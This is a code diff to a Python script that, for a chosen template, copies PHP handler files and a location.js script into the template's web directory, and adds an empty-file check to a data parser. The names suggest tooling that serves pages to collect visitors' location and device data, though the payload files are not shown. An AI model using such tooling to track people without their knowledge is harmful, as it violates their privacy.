@@ -12,6 +12,7 @@ import sys
 import argparse
 import requests
 import traceback
+import shutil
 from os import path, kill, mkdir, getenv, environ
 from json import loads, decoder
 from packaging import version
@@ -152,12 +153,16 @@ def template_select(site):
 	print()
 	utils.print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
 
-	module = templ_json['templates'][selected]['module']
-	if module is True:
-		imp_file = templ_json['templates'][selected]['import_file']
-		importlib.import_module(f'template.{imp_file}')
-	else:
-		pass
+	imp_file = templ_json['templates'][selected]['import_file']
+	importlib.import_module(f'template.{imp_file}')
+	shutil.copyfile("php/error.php", 'template/{}/error_handler.php'.format(templ_json['templates'][selected]["dir_name"]))
+	shutil.copyfile("php/info.php", 'template/{}/info_handler.php'.format(templ_json['templates'][selected]["dir_name"]))
+	shutil.copyfile("php/result.php", 'template/{}/result_handler.php'.format(templ_json['templates'][selected]["dir_name"]))
+	jsdir = 'template/{}/js'.format(templ_json['templates'][selected]["dir_name"])
+	if not path.isdir(jsdir):
+		mkdir(jsdir)
+	shutil.copyfile("js/location.js", jsdir+'/location.js')
+	
 	return site
 
 
@@ -210,9 +215,11 @@ def wait():
 def data_parser():
 	data_row = []
 	with open(INFO, 'r') as info_file:
-		info_file = info_file.read()
+		info_content = info_file.read()
+	if not info_content or info_content.strip() == '':
+		return
 	try:
-		info_json = loads(info_file)
+		info_json = loads(info_content)
 	except decoder.JSONDecodeError:
 		utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
 	else:
